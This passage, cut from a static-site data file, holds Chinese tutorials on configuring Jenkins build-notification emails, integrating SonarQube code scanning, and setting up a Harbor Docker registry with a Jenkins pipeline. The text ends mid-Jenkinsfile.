charset="UTF-8">\n    <title>${ENV, var="JOB_NAME"}-第${BUILD_NUMBER}次构建日志</title>\n</head>\n<body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n<table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n    <tr>\n        <td>(本邮件是程序自动下发的，请勿回复！)</td>\n    </tr>\n    <tr>\n        <td><h2>\n            <font color="#0000FF">构建结果 - ${BUILD_STATUS}</font>\n        </h2></td>\n    </tr>\n    <tr>\n        <td><br/>\n            <b><font color="#0B610B">构建信息</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>项目名称&nbsp;：&nbsp;${PROJECT_NAME}</li>\n                <li>构建编号&nbsp;：&nbsp;第${BUILD_NUMBER}次构建</li>\n                <li>触发原因：&nbsp;${CAUSE}</li>\n                <li>构建日志：&nbsp;\n                    <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                </li>\n                <li>构建&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                    <a href="${BUILD_URL}">${BUILD_URL}</a>\n                </li>\n                <li>工作目录&nbsp;：&nbsp;\n                    <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                </li>\n                <li>项目&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                    <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                </li>\n            </ul>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>历史变更记录 : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n            </ul>\n            ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n        </td>\n    </tr>\n    <tr>\n        <td><b>Failed Test Results</b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                $FAILED_TESTS\n            </pre>\n            <br/>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0B610B">构建日志 (最后 100行):</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <textarea cols="80" rows="30" readonly="readonly"\n                      style="font-family: Courier New">\n                ${BUILD_LOG,maxLines=100}\n            </textarea>\n        </td>\n    </tr>\n</table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\n这里的参数都为 Jenkins 的参数，具体参数在 Jenkins 系统配置里可以看到，点击如下的问号就行。\n\n\n\n\n\n添加 post，post 意思是构建后操作，post 可以根据 stage 的结果执行不同的逻辑，比如 stages 里面都执行完成，他会走 post 里的 success 代码，如果失败会走 failure 代码。而 post 的语法该如何写，可以到 流水线语法 中看到。\n\n\n\n * Always run, regardless of build status 无论构建的结果如何都会执行\n * Run if the build status is "Failure" 构建失败运行\n * Run if the build status is "Success" or hasnt been set yet 构建成功运行\n\n至于，邮件的内容，可以在片段生成器中查出来\n\n\n\n    post {\n        always {\n            emailext(\n                # 可以使用 jenkins 里面的参数\n                subject: \'构建通知：${PROJECT_NAME} - Build # ${BUILD_NUMBER} - ${BUILD_STATUS}!\',\n                # 读取 email.html 文件\n                body: \'${FILE,path="email.html"}\',\n                # 邮件的收件人\n                to: \'xxxxxx@qq.com\'\n            )\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n${FILE,path="PATH"} 可以在系统配置中了解\n\n\n\n然后去构建你的项目，就可以收到 构建项目的邮件了。\n\n\n# jenkins 配置 SonarQube（代码审查）\n\nSonarQube 是一个用于管理代码质量的开放平台，可以快速的定位代码中潜在的或者明显的错误。目前支持 java,C#,C/C++,Python,PL/SQL,Cobol,JavaScrip,Groovy 等二十几种编程语言的代码质量管理与检测。官网：https://www.sonarqube.org/\n\n软件          版本\nJDK         1.8\nmysql       8.0\nSonarQube   6.7.4\n\n下载 sonar 压缩包：https://www.sonarqube.org/downloads/\n\n# 解压 \nunzip sonarqube-6.7.4.zip\n# 创建sonar用户，必须sonar用于启动，否则报错\nuseradd sonar \n# 更改sonar目录及文件权限\nchown -R sonar. /opt/software/sonar\n\n\n1\n2\n3\n4\n5\n6\n\n\n修改 sonar 配置文件\n\nvim /opt/software/sonar/conf/sonar.properties\nsonar.jdbc.username=xxxx\nsonar.jdbc.password=xxxxxx\njdbc:mysql://xxxxxxxxxxx:3306/sonar?useUnicode=true&characterEncoding=utf8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai&rewriteBatchedStatements=true&useConfigs=maxPerformance\n\n\n1\n2\n3\n4\n\n\n启动 sonar\n\ncd /opt/software/sonar/\n# 启动\nsu sonar ./bin/linux-x86-64/sonar.sh start \n# 查看状态\nsu sonar ./bin/linux-x86-64/sonar.sh status \n# 停止\nsu sonar ./bin/linux-x86-64/sonar.sh stop \n# 查看日志\ntail -f logs/sonar.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> 7.9 以后不支持 mysql，只支持 h2、mssql、postgresql ，7.9 以下也只支持 mysql5.7，所以这里就不在继续了，大致说清楚就好，当安装好后访问 web 页面，默认 9000 端口，得到一个 token 记录下来。\n\n\n\n1. 在 Jenkins 中安装 SonarQube Scanner 插件\n2. 在 Jenkins->Manager Jenkins->Global Tool Configuration->SonarQube Scanner-> 新增 SonarQube Scanner\n\n1. 填入 Name，名字可以自己随便起\n2. 勾选 Install automatically\n3. 选择安装的版本\n4. 点击应用并保存\n\n\n1\n2\n3\n4\n\n\n3. 在 Jenkins->Manager Jenkins->Configure System->SonarQube servers->Add SonarQube\n\n1. 填入 Name，该名字可以随便起\n2. 填写安装 SonarQube 的 web 地址 IP:PORT\n3. 添加证书，该证书就是访问 SonarQube 获取到的token，也可以在Jenkins的全局凭证里去添加这个证书，但类型需要是 Secret text\n4. 应用并保存\n\n\n1\n2\n3\n4\n\n\n4. 非结构性项目检查，到项目配置中找到构建，在正常的构建项目名录后可以增加构建步骤，然后再下拉选项中找到 Execute SonarQube Scanner\n\n1. 填写Task to run，执行 SonarQube 的命令，输入 scan（触发代码扫描以及检测）\n2. 代码需要的JDK环境，这个JDK环境是在全局配置中配置得到的\n3. 在 Analysis properties 填如内容\n\n# must be unique in a given SonarQube instance，项目标记\nsonar.projectKey=web_demo\n# this is the name and version displayed in the SonarQube UI. Was mandatoryprior to SonarQube 6.1.，项目名称\nsonar.projectName=web_demo\n# 版本\nsonar.projectVersion=1.0\n# Path is relative to the sonar-project.properties file. Replace "\\" by "/" on\nWindows.\n# This property is optional if sonar.modules is set. 扫描代码的路径 . 代表当前项目根目录下扫描所有代码及文件，也可以直接扫描指定包代码，如 /src/main/**\nsonar.sources=.\n# 排除的一些文件不扫描\nsonar.exclusions=**/test/**,**/target/**\n# jdk版本\nsonar.java.source=1.8\nsonar.java.target=1.8\n# Encoding of the source code. Default is default system encoding，编码格式\nsonar.sourceEncoding=UTF-8\n\n4.应用并保存后构建项目\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n5. 流水线项目添加 SonarQube 功能，可以把内容添加到项目中，防止 jenkins 意外的崩溃，导致配置丢失\n\n1. 在项目中根路径下新建 sonar-project.properties，并把内容复制过来\n2. 到项目中的 Jenkinsfile 中编写内容\n\npipeline {\n    agent any\n\n    stages {\n        stage(\'pull code\') {\n            steps {\n                echo \'master 分支的事情 参数是=${branch}\'\n                checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n            }\n        }\n        # 代码检查，可以把该步骤添加到任意位置\n        stage(\'code checking\') {\n            steps {\n                script {\n                    # \'\' 这里写的是在jenkins->Global Tool Configuration->SonarQube Scanner->新增的SonarQube Scanner的Name\n                    scannerHome = tool \'sonar-scanner\'\n                }\n                # () 里的内容是在 jenkins->Configure System->SonarQube servers->里的 Name\n                withSonarQubeEnv(\'sonarqube6.7.4\') {\n                    # 这里是 jenkins 在配置 SonarQube Scanner的时候安装的工具，他自己安装的不需要我们管\n                    sh "${scannerHome}/bin/sonar-scanner"\n                }\n            }\n        }\n        stage(\'build project\') {\n            steps {\n                sh \'mvn clean package\'\n            }\n        }\n    }\n    post {\n        always {\n            emailext(\n                subject: \'构建通知：${PROJECT_NAME} - Build # ${BUILD_NUMBER} - ${BUILD_STATUS}!\',\n                body: \'${FILE,path="email.html"}\',\n                to: \'875730567@qq.com\'\n            )\n        }\n    }\n}\n\n3. 提交后就可以到 jenkins 去构建项目，结果要去 SonarQube web 去看\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n',normalizedContent:'# 内置触发器\n\njenkins 内置 4 种构建触发器：\n\n * 触发远程构建，通过一个远程地址触发项目的执行\n * 其他工程构建后触发（build after other projects are build），就是需要前面一个项目构建完成后触发我的项目构建\n * 定时构建（build periodically），顾名思义就是 类似于 corn 表达式，定时执行\n * 轮询 scm（poll scm），会定时扫描本地代码仓库是否有变更，如果代码有变更就触发项目构建\n\n\n# 远程构建\n\n在项目中的配置中，构建触发器选中远程构建。\n\n\n\n通过浏览器访问 http://192.168.81.102:7777/job/test01/build?token=6666 进行项目构建\n\n\n# 其他工程构建后触发\n\n\n\n\n\n应用保存后，就可以构建 maven_project 了。\n\n\n# 定时构建\n\n定时字符串从左往右分别为： 分 时 日 月 周\n一些定时表达式的例子：\n\n# 每30分钟构建一次：h代表形参(代表小时，测试用 *)\nh/30 * * * * 10:02 10:32\n# 每2个小时构建一次: \nh h/2 * * *\n# 每天的8点，12点，22点，一天构建3次： (多个时间点中间用逗号隔开) \n0 8,12,22 * * *\n# 每天中午12点定时构建一次 \nh 12 * * *\n# 每天下午18点定时构建一次 \nh 18 * * *\n# 在每个小时的前半个小时内的每10分钟 h(0-29)/10 * * * *\n# 每两小时一次，每个工作日上午9点到下午5点(也许是上午10:38，下午12:38，下午2:38，下午4:38) h h(9-16)/2 * * 1-5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n# 轮询 scm\n\n该构建触发器，jenkins 会定时扫描本地整个项目的代码，增大系统的开销，不建议使用。\n\n\n\n\n# git hook 自动触发构建\n\n在 jenkins 的内置构建触发器中，轮询 scm 可以实现 gitlab 代码更新，项目自动构建，但是该方案的性能不佳。那有没有更好的方案呢？ 有的。就是利用 gitlab 的 webhook 实现代码 push 到仓库，立即触发项目自动构建。\n\n\n\n\n# 安装 gitlab hook 插件\n\n需要安装两个插件：gitlab hook 和 gitlab，安装好后在项目配置的构建触发器中，会多一个选项\n\n\n\n关于 gitlab 之后的操作请百度，我这里使用的是 gitea。\n\ngitea 需要下载 generic webhook trigger 插件，安装后到项目配置\n\n\n\n\n\n\n\n\n\n配置完成后就可以测试了，只要提交了代码就会构建项目。\n\n\n# jenkins 的参数化构建\n\n有时在项目构建的过程中，我们需要根据用户的输入动态传入一些参数，从而影响整个构建结果，这时我们可以使用参数化构建。\n\njenkins 支持非常丰富的参数类型\n\n\n\n\n# string parameter\n\n这样的方式只能适用于 pipeline 项目\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n这种方式输入哪个分支，就构建哪个分支\n\n\n# 配置邮箱服务器发送构建结果\n\n\n# 安装 email extension 插件\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n可以测试发送\n\n> 如果 jenkins 报错： can\'t send command to smtp host; 有可能是管理员的邮箱没有填写或者和认证者的邮箱不相同。\n\n\n# 准备邮件内容\n\n在项目根目录编写 email.html，并把文件推送 git\n\n<!doctype html>\n<html>\n<head>\n    <meta charset="utf-8">\n    <title>${env, var="job_name"}-第${build_number}次构建日志</title>\n</head>\n<body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n<table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n    <tr>\n        <td>(本邮件是程序自动下发的，请勿回复！)</td>\n    </tr>\n    <tr>\n        <td><h2>\n            <font color="#0000ff">构建结果 - ${build_status}</font>\n        </h2></td>\n    </tr>\n    <tr>\n        <td><br/>\n            <b><font color="#0b610b">构建信息</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>项目名称&nbsp;：&nbsp;${project_name}</li>\n                <li>构建编号&nbsp;：&nbsp;第${build_number}次构建</li>\n                <li>触发原因：&nbsp;${cause}</li>\n                <li>构建日志：&nbsp;\n                    <a href="${build_url}console">${build_url}console</a>\n                </li>\n                <li>构建&nbsp;&nbsp;url&nbsp;：&nbsp;\n                    <a href="${build_url}">${build_url}</a>\n                </li>\n                <li>工作目录&nbsp;：&nbsp;\n                    <a href="${project_url}ws">${project_url}ws</a>\n                </li>\n                <li>项目&nbsp;&nbsp;url&nbsp;：&nbsp;\n                    <a href="${project_url}">${project_url}</a>\n                </li>\n            </ul>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0b610b">changes since last successful build:</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>历史变更记录 : <a href="${project_url}changes">${project_url}changes</a></li>\n            </ul>\n            ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n        </td>\n    </tr>\n    <tr>\n        <td><b>failed test results</b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                $failed_tests\n            </pre>\n            <br/>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0b610b">构建日志 (最后 100行):</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <textarea cols="80" rows="30" readonly="readonly"\n                      style="font-family: courier new">\n                ${build_log,maxlines=100}\n            </textarea>\n        </td>\n    </tr>\n</table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\n这里的参数都为 jenkins 的参数，具体参数在 jenkins 系统配置里可以看到，点击如下的问号就行。\n\n\n\n\n\n添加 post，post 意思是构建后操作，post 可以根据 stage 的结果执行不同的逻辑，比如 stages 里面都执行完成，他会走 post 里的 success 代码，如果失败会走 failure 代码。而 post 的语法该如何写，可以到 流水线语法 中看到。\n\n\n\n * always run, regardless of build status 无论构建的结果如何都会执行\n * run if the build status is "failure" 构建失败运行\n * run if the build status is "success" or hasnt been set yet 构建成功运行\n\n至于，邮件的内容，可以在片段生成器中查出来\n\n\n\n    post {\n        always {\n            emailext(\n                # 可以使用 jenkins 里面的参数\n                subject: \'构建通知：${project_name} - build # ${build_number} - ${build_status}!\',\n                # 读取 email.html 文件\n                body: \'${file,path="email.html"}\',\n                # 邮件的收件人\n                to: \'xxxxxx@qq.com\'\n            )\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n${file,path="path"} 可以在系统配置中了解\n\n\n\n然后去构建你的项目，就可以收到 构建项目的邮件了。\n\n\n# jenkins 配置 sonarqube（代码审查）\n\nsonarqube 是一个用于管理代码质量的开放平台，可以快速的定位代码中潜在的或者明显的错误。目前支持 java,c#,c/c++,python,pl/sql,cobol,javascrip,groovy 等二十几种编程语言的代码质量管理与检测。官网：https://www.sonarqube.org/\n\n软件          版本\njdk         1.8\nmysql       8.0\nsonarqube   6.7.4\n\n下载 sonar 压缩包：https://www.sonarqube.org/downloads/\n\n# 解压 \nunzip sonarqube-6.7.4.zip\n# 创建sonar用户，必须sonar用于启动，否则报错\nuseradd sonar \n# 更改sonar目录及文件权限\nchown -r sonar. /opt/software/sonar\n\n\n1\n2\n3\n4\n5\n6\n\n\n修改 sonar 配置文件\n\nvim /opt/software/sonar/conf/sonar.properties\nsonar.jdbc.username=xxxx\nsonar.jdbc.password=xxxxxx\njdbc:mysql://xxxxxxxxxxx:3306/sonar?useunicode=true&characterencoding=utf8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai&rewritebatchedstatements=true&useconfigs=maxperformance\n\n\n1\n2\n3\n4\n\n\n启动 sonar\n\ncd /opt/software/sonar/\n# 启动\nsu sonar ./bin/linux-x86-64/sonar.sh start \n# 查看状态\nsu sonar ./bin/linux-x86-64/sonar.sh status \n# 停止\nsu sonar ./bin/linux-x86-64/sonar.sh stop \n# 查看日志\ntail -f logs/sonar.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> 7.9 以后不支持 mysql，只支持 h2、mssql、postgresql ，7.9 以下也只支持 mysql5.7，所以这里就不在继续了，大致说清楚就好，当安装好后访问 web 页面，默认 9000 端口，得到一个 token 记录下来。\n\n\n\n1. 在 jenkins 中安装 sonarqube scanner 插件\n2. 在 jenkins->manager jenkins->global tool configuration->sonarqube scanner-> 新增 sonarqube scanner\n\n1. 填入 name，名字可以自己随便起\n2. 勾选 install automatically\n3. 选择安装的版本\n4. 点击应用并保存\n\n\n1\n2\n3\n4\n\n\n3. 在 jenkins->manager jenkins->configure system->sonarqube servers->add sonarqube\n\n1. 填入 name，该名字可以随便起\n2. 填写安装 sonarqube 的 web 地址 ip:port\n3. 添加证书，该证书就是访问 sonarqube 获取到的token，也可以在jenkins的全局凭证里去添加这个证书，但类型需要是 secret text\n4. 应用并保存\n\n\n1\n2\n3\n4\n\n\n4. 非结构性项目检查，到项目配置中找到构建，在正常的构建项目名录后可以增加构建步骤，然后再下拉选项中找到 execute sonarqube scanner\n\n1. 填写task to run，执行 sonarqube 的命令，输入 scan（触发代码扫描以及检测）\n2. 代码需要的jdk环境，这个jdk环境是在全局配置中配置得到的\n3. 在 analysis properties 填如内容\n\n# must be unique in a given sonarqube instance，项目标记\nsonar.projectkey=web_demo\n# this is the name and version displayed in the sonarqube ui. was mandatoryprior to sonarqube 6.1.，项目名称\nsonar.projectname=web_demo\n# 版本\nsonar.projectversion=1.0\n# path is relative to the sonar-project.properties file. replace "\\" by "/" on\nwindows.\n# this property is optional if sonar.modules is set. 扫描代码的路径 . 代表当前项目根目录下扫描所有代码及文件，也可以直接扫描指定包代码，如 /src/main/**\nsonar.sources=.\n# 排除的一些文件不扫描\nsonar.exclusions=**/test/**,**/target/**\n# jdk版本\nsonar.java.source=1.8\nsonar.java.target=1.8\n# encoding of the source code. default is default system encoding，编码格式\nsonar.sourceencoding=utf-8\n\n4.应用并保存后构建项目\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n5. 流水线项目添加 sonarqube 功能，可以把内容添加到项目中，防止 jenkins 意外的崩溃，导致配置丢失\n\n1. 在项目中根路径下新建 sonar-project.properties，并把内容复制过来\n2. 到项目中的 jenkinsfile 中编写内容\n\npipeline {\n    agent any\n\n    stages {\n        stage(\'pull code\') {\n            steps {\n                echo \'master 分支的事情 参数是=${branch}\'\n                checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n            }\n        }\n        # 代码检查，可以把该步骤添加到任意位置\n        stage(\'code checking\') {\n            steps {\n                script {\n                    # \'\' 这里写的是在jenkins->global tool configuration->sonarqube scanner->新增的sonarqube scanner的name\n                    scannerhome = tool \'sonar-scanner\'\n                }\n                # () 里的内容是在 jenkins->configure system->sonarqube servers->里的 name\n                withsonarqubeenv(\'sonarqube6.7.4\') {\n                    # 这里是 jenkins 在配置 sonarqube scanner的时候安装的工具，他自己安装的不需要我们管\n                    sh "${scannerhome}/bin/sonar-scanner"\n                }\n            }\n        }\n        stage(\'build project\') {\n            steps {\n                sh \'mvn clean package\'\n            }\n        }\n    }\n    post {\n        always {\n            emailext(\n                subject: \'构建通知：${project_name} - build # ${build_number} - ${build_status}!\',\n                body: \'${file,path="email.html"}\',\n                to: \'875730567@qq.com\'\n            )\n        }\n    }\n}\n\n3. 提交后就可以到 jenkins 去构建项目，结果要去 sonarqube web 去看\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n',charsets:{cjk:!0}},{title:"Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）",frontmatter:{title:"Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/506",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/506.Jenkins(%E4%B8%83)%20Jenkins+Docker+SpringCloud%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%EF%BC%88%E4%B8%8A%EF%BC%89.html",relativePath:"04.运维/50.Jenkins/506.Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）.md",key:"v-f2dce1b0",path:"/jenkins/506/",headers:[{level:2,title:"Harbor 镜像仓库安装及使用",slug:"harbor-镜像仓库安装及使用",normalizedTitle:"harbor 镜像仓库安装及使用",charIndex:269},{level:3,title:"Harbor 安装",slug:"harbor-安装",normalizedTitle:"harbor 安装",charIndex:734},{level:3,title:"Harbor 使用",slug:"harbor-使用",normalizedTitle:"harbor 使用",charIndex:1263},{level:3,title:"推送到镜像仓库",slug:"推送到镜像仓库",normalizedTitle:"推送到镜像仓库",charIndex:1440},{level:2,title:"微服务构建到docker镜像",slug:"微服务构建到docker镜像",normalizedTitle:"微服务构建到 docker 镜像",charIndex:2148},{level:2,title:"jenkins自动化服务拉取镜像并启动",slug:"jenkins自动化服务拉取镜像并启动",normalizedTitle:"jenkins 自动化服务拉取镜像并启动",charIndex:8540},{level:2,title:"vue 前端使用Jenkins部署",slug:"vue-前端使用jenkins部署",normalizedTitle:"vue 前端使用 jenkins 部署",charIndex:14905}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Harbor 镜像仓库安装及使用 Harbor 安装 Harbor 使用 推送到镜像仓库 微服务构建到docker镜像 jenkins自动化服务拉取镜像并启动 vue 前端使用Jenkins部署",content:'大致流程说明：\n1. 开发人员每天把代码提交到 Gitlab 代码仓库\n2.Jenkins 从 Gitlab 中拉取项目源码，编译并打成 jar 包，然后构建成 Docker 镜像，将镜像上传到 Harbor 私有仓库。\n3.Jenkins 发送 SSH 远程命令，让生产部署服务器到 Harbor 私有仓库拉取镜像到本地，然后创建容器。\n4. 最后，用户可以访问到容器\n\n> 这里不讲述 Docker 的安装及基础命令的使用，学 dockers 可以看 Docker 概念、命令、DockerFile 等看这篇就够了 这篇文章\n\n\n# Harbor 镜像仓库安装及使用\n\nHarbor（港口，港湾）是一个用于存储和分发 Docker 镜像的企业级 Registry 服务器。除了 Harbor 这个私有镜像仓库之外，还有 Docker 官方提供的 Registry。相对 Registry，Harbor 具有很多优势：\n\n 1. 提供分层传输机制，优化网络传输 Docker 镜像是是分层的，而如果每次传输都使用全量文件 (所以\n    用 FTP 的方式并不适合)，显然不经济。必须提供识别分层传输的机制，以层的 UUID 为标识，确定\n    传输的对象。\n 2. 提供 WEB 界面，优化用户体验 只用镜像的名字来进行上传下载显然很不方便，需要有一个用户界\n    面可以支持登陆、搜索功能，包括区分公有、私有镜像。\n 3. 支持水平扩展集群 当有用户对镜像的上传下载操作集中在某服务器，需要对相应的访问压力作分\n    解。\n 4. 良好的安全机制 企业中的开发团队有很多不同的职位，对于不同的职位人员，分配不同的权限，\n    具有更好的安全性。\n\n\n# Harbor 安装\n\n 1. 除了 docker 以外，还要安装 dockers-compose，Docker Compose 命令及使用 你可以看这篇博客\n 2. 下载 Harbor 的压缩包，地址，需要科式上网，下载完成开始解压\n\ntar -xzf harbor-offline-installer-v1.9.2.tgz\nmv harbor /opt/software/\n# 修改配置文件内容\nvim /opt/software/harbor/harbor.yml \n# 修改hostname\nhostname: 你自己机器的IP\n# 修改端口\nport: 85\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. 安装 Harbor\n\ncd /opt/software/harbor\n./prepare\n./install.sh\n\n\n1\n2\n3\n\n 4. 启动 Harbor\n\ndocker-compose up -d 启动\ndocker-compose stop 停止\ndocker-compose restart 重新启动\n\n\n1\n2\n3\n\n 5. 访问 Harbor http://IP:85，默认账户密码：admin/Harbor12345\n\n\n# Harbor 使用\n\n1. 创建项目\nHarbor 的项目分为公开和私有的：\n\n * 公开项目：所有用户都可以访问，通常存放公共的镜像，默认有一个 library 公开项目。\n * 私有项目：只有授权用户才可以访问，通常存放项目本身的镜像。\n\n我们可以为微服务项目创建一个新的项目：\n\n\n\n\n\n2. 用户创建\n\n\n\n3. 为用户分配项目\n\n\n\n\n\n\n# 推送到镜像仓库\n\n# 打标签，命令 docker tag nginx:1.17.1 Harbor的IP:端口/Harbor项目的名称/镜像名字\ndocker tag nginx:1.17.1 192.168.81.102:85/test/nginx:1.17.1\n# 查看\ndocker images\n# 会多一条镜像数据\n192.168.81.102:85/test/nginx         1.17.1                          98ebf73aba75        2 years ago         109MB\n\n\n1\n2\n3\n4\n5\n6\n\n\n把 Harbor 地址加入到 Docker 信任列表\n\n# 编辑docker文件\nvim /etc/docker/daemon.json\n# 加入这句话\n"insecure-registries":["192.168.81.102:85"],\n# 重启配置和docker\nsystemctl restart docker\n# Harbor  的 test 项目是私有的，需要登录\ndocker login -u admin -p Harbor12345 192.168.81.102:85\n# 推送到Harbor仓库里\ndocker push 192.168.81.102:85/test/nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\n其他服务下载镜像也需要把地址添加到 docker 的配置文件中，并且也需要使用 docker login 进行登录。复制以下的命令，到其他服务器下执行即可。\n\n\n\n\n# 微服务构建到 docker 镜像\n\n1. 把微服务提交到 SVN\n2. 在 jenkins 上创建一个 Pipelin 类型的 item（项目）\n3. 配置 Pipelin item 的构建时参数\n\n\n\n\n\n\n\n> 这里讲一点，项目中很多的 jar 是有依赖关系的，如果单独打某个服务可能会包找不到依赖，所以建议第一次对根目录进行打包，会把依赖全部加载到 maven 库中，后期单个服务打包即可。\n\n4. 在每个服务的 pom 文件中添加 plugin\n\n\x3c!-- 帮助读取项目中的dockerfile文件，帮我们构建docker镜像 --\x3e\n<plugin>\n    <groupId>com.spotify</groupId>\n    <artifactId>dockerfile-maven-plugin</artifactId>\n    <version>1.3.6</version>\n    <configuration>\n        <repository>${project.artifactId}</repository>\n        \x3c!-- 定义dockerfile 文件的参数 --\x3e\n        <buildArgs>\n            \x3c!-- 定义一个 JAVA_FILE 参数,指为我们项目的名称 --\x3e\n            <JAR_FILE>target/${project.build.finalName}.jar</JAR_FILE>\n        </buildArgs>\n    </configuration>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n5. 在每个服务的根目录下编写 Dockerfile 文件\n\nFROM openjdk:8-jdk-alpine\n# 这个会读取在pom中声明的变量\nARG JAR_FILE\nCOPY ${JAR_FILE} app.jar\n# 对外端口\nEXPOSE 10086\nENTRYPOINT ["java","-jar","/app.jar"]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n6. 设置构建后镜像推至镜像仓库\n\n\n\n\n\n\n\n7. 在项目的根目录中编写 Jenkinsfile\n\nnode {\n    // 版本\n    def tag = "1.0"\n    // 镜像仓库的地址\n    def harbor_url = "192.168.81.102:85"\n    // 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\n    def harbor_project = "demo"\n\n    // 拉取代码\n    